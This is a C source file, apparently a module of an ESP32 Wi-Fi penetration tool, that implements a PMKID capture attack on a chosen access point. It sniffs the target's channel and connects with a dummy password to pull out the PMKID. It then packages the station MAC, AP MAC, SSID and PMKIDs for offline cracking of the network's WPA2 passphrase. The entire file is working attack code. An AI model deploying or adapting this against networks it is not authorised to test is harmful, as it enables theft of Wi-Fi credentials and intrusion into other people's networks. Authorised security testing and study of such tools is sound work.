#include "attack_pmkid.h"
#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "esp_log.h"
#include <string.h>
static const char *TAG = "attack_pmkid";
static const wifi_ap_record_t *ap_record;
static bool active;

static void pmkid_exit_condition_handler(void *arg, esp_event_base_t base, int32_t id, void *data) {
    pmkid_result_t *result = data;
    if (!active || !result->count || result->generation != wifictl_sniffer_generation()) return;
    attack_lock();
    const attack_job_t *job = attack_get_job();
    size_t ssid_size = job->ssid_len;
    size_t size = 13 + ssid_size + (size_t)result->count * 16;
    char *content = attack_alloc_result_content(size);
    if (content) {
        /* Preserve the existing wire layout: station MAC, AP MAC, SSID, PMKIDs. */
        memcpy(content, result->station, 6);
        memcpy(content + 6, ap_record->bssid, 6);
        content[12] = ssid_size;
        memcpy(content + 13, job->ssid, ssid_size);
        memcpy(content + 13 + ssid_size, result->pmkids, result->count * 16);
    }
    attack_unlock();
    attack_pmkid_stop();
    attack_update_status(content ? FINISHED : TIMEOUT);
}

void attack_pmkid_start(attack_config_t *config) {
    ap_record = config->ap_record;
    active = true;
    const char *stage = "event_handler";
    esp_err_t err = esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID,
                                              pmkid_exit_condition_handler, NULL);
    if (err != ESP_OK) goto failed;
    frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
    stage = "sniffer_filter";
    err = wifictl_sniffer_filter_frame_types(true, false, false);
    if (err == ESP_OK) { stage = "sniffer_start"; err = wifictl_sniffer_start(ap_record->primary); }
    if (err == ESP_OK) { stage = "sta_connect"; err = wifictl_sta_connect_to_ap(ap_record, "dummypassword"); }
failed:
    if (err != ESP_OK) {
        attack_note_setup_failure(err, stage);
        ESP_LOGE(TAG, "Capture start failed at %s: %s", stage, esp_err_to_name(err));
        attack_pmkid_stop();
        attack_update_status(TIMEOUT);
    }
}

void attack_pmkid_stop(void) {
    if (!active) return;
    active = false;
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    wifictl_sta_disconnect();
    esp_err_t err = esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID,
                                               pmkid_exit_condition_handler);
    if (err != ESP_OK) ESP_LOGW(TAG, "Handler cleanup: %s", esp_err_to_name(err));
    ap_record = NULL;
}
